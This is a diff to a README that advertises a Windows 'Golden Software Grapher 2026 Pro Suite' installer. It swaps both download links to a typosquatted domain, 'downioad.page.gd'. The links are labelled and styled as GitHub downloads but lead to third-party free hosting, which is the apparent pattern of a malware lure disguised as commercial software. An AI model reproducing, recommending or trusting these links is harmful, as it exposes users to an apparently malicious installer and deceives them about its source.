@@ -2,7 +2,7 @@
 
 Golden Software Grapher is a powerful and versatile software designed for scientists, engineers, and researchers who need to create precise and visually appealing plots. This 2026 Pro Suite edition includes advanced features and tools to streamline your data visualization workflow on Windows 10 and 11. With its user-friendly interface and robust capabilities, it stands out as a leading choice for professional graphing needs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -77,7 +77,7 @@ A: The current release includes an installer version. For portable use, check th
 
 To get started with Golden Software Grapher 2026 Pro Suite, download the latest version from GitHub:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
 
